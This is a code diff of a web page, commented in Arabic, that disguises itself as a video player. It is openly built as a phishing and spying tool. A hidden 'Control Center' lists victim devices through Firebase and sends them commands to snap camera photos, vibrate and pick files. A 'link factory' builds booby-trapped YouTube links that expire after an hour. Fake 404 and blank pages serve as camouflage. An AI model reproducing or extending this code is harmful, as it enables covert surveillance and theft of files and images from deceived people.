@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>404 Not Found</title>
+    <title>Media System</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #000; }
-        body { background: var(--bg); color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
+        :root { --neon: #00ff41; }
+        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; }
         
-        /* لوحة التحكم */
-        #admin-panel { display: none; padding: 15px; height: 100vh; overflow-y: auto; color: var(--neon); font-family: 'Courier New', monospace; }
-        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 8px; border-radius: 5px; cursor: pointer; }
+        /* لوحة التحكم (مخفية) */
+        #admin-panel { display: none; padding: 20px; color: var(--neon); font-family: 'Courier New', monospace; height: 100vh; overflow-y: auto; }
+        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
         .v-card.active { border-color: #fff; background: #111; }
         button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; font-weight: bold; }
-        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-top: 5px; }
+        input { width: 100%; padding: 10px; background: #000; color: var(--neon); border: 1px solid var(--neon); margin-bottom: 10px; }
 
         /* واجهة الضحية */
-        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
-        .play-btn { width: 70px; height: 70px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
-        .play-btn::after { content: ''; position: absolute; top: 18px; left: 26px; border-left: 25px solid #fff; border-top: 17px solid transparent; border-bottom: 17px solid transparent; }
+        #vic-panel { display: none; height: 100vh; width: 100vw; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; background: #000; z-index: 1000; }
+        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
     </style>
 </head>
 <body>
@@ -28,11 +28,11 @@
 <div id="vic-panel">
     <div id="p-scr">
         <div class="play-btn" onclick="startGhost()"></div>
-        <p style="margin-top:20px;">Tap to Play Video</p>
+        <p style="margin-top:20px;">انقر للتشغيل | Tap to Play</p>
     </div>
     <div id="l-scr" style="display:none; text-align:center;">
         <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
-        <p>Loading Content...</p>
+        <p>جاري تحميل الفيديو...</p>
     </div>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -40,23 +40,23 @@
 </div>
 
 <div id="admin-panel">
-    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ CONTROL CENTER V17</h3>
-    <div id="v-list">بانتظار الأجهزة...</div>
+    <h2 style="border-bottom: 1px solid var(--neon);">CONTROL CENTER V18</h2>
+    <div id="v-list">بانتظار المتصلين...</div>
     <hr>
     <div id="ctrls">
-        <h4>Target: <span id="t-name">None</span></h4>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
-            <button onclick="send('snap')">📸 Snap</button>
+        <h3>Target: <span id="t-name">None</span></h3>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+            <button onclick="send('snap')">📸 Snap Photo</button>
             <button onclick="send('vibrate')">📳 Vibrate</button>
             <button onclick="send('pick')">📂 Pick Files</button>
             <button onclick="send('release')" style="background:#030;">🔓 Release</button>
         </div>
-        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:15px;">🗑️ Clear All Sessions</button>
+        <button onclick="db.ref('/').remove()" style="color:red; border-color:red; margin-top:20px;">🗑️ Clear Data</button>
     </div>
     <hr>
-    <h4>مصنع الروابط (تنتهي بعد ساعة):</h4>
-    <input type="text" id="target-url" placeholder="رابط يوتيوب">
-    <button onclick="gen()">توليد رابط ملغم</button>
+    <h3>مصنع الروابط (تنتهي تلقائياً بعد ساعة):</h3>
+    <input type="text" id="target-url" placeholder="رابط يوتيوب المستهدف">
+    <button onclick="gen()">صناعة الرابط الملغم</button>
     <div id="res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
 </div>
 
@@ -71,19 +71,20 @@
     let selId = null;
 
     const urlParams = new URLSearchParams(window.location.search);
-    const isVictim = urlParams.get('v');
     const isAdmin = urlParams.get('admin');
+    const isVictim = urlParams.get('v');
 
-    // --- المنطق الذكي للفصل ---
+    // --- نظام الفحص الذكي ---
     if (isAdmin === "1") {
-        // الآدمن يفتح دائماً
+        // أنت المدير: افتح فوراً وتجاهل الوقت
         document.getElementById('admin-panel').style.display = 'block';
         runAdmin();
     } else if (isVictim) {
+        // ضحية: افحص صلاحية الوقت (ساعة واحدة)
         try {
             const data = JSON.parse(atob(isVictim));
-            const diff = Date.now() - data.time;
-            if (diff > 3600000) { // مر أكثر من ساعة
+            if (Date.now() - data.time > 3600000) {
+                // الرابط مات
                 document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
             } else {
                 document.getElementById('vic-panel').style.display = 'flex';
@@ -91,10 +92,11 @@
             }
         } catch(e) { document.body.innerHTML = "404 Not Found"; }
     } else {
-        document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
+        // دخول عشوائي: اظهر صفحة سوداء فارغة للتمويه
+        document.body.innerHTML = "<div style='background:#000; height:100vh;'></div>";
     }
 
-    // --- الآدمن ---
+    // --- وظائف الإدارة ---
     function runAdmin() {
         db.ref('victims').on('value', s => {
             const list = document.getElementById('v-list');
@@ -102,12 +104,9 @@
             s.forEach(child => {
                 const v = child.val(); const id = child.key;
                 const active = (Date.now() - v.lastSeen) < 10000;
-                list.innerHTML += `<div class="v-card" onclick="sel('${id}','${v.model}')" style="border-color:${id==selId?'#fff':'#333'}">
-                    <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model}
+                list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="sel('${id}','${v.model}')">
+                    <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model} (${v.time})
                 </div>`;
-                if(id === selId && v.files) {
-                    // هنا تظهر الصور والملفات المسحوبة (اختياري)
-                }
             });
         });
     }
@@ -119,10 +118,10 @@
         document.getElementById('res').innerText = window.location.href.split('?')[0] + "?v=" + payload;
     }
 
-    // --- الضحية ---
+    // --- وظائف الضحية ---
     let myRef = null;
     function runVictim(target) {
-        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile";
+        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
         myRef = db.ref('victims').push();
         myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
         setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);
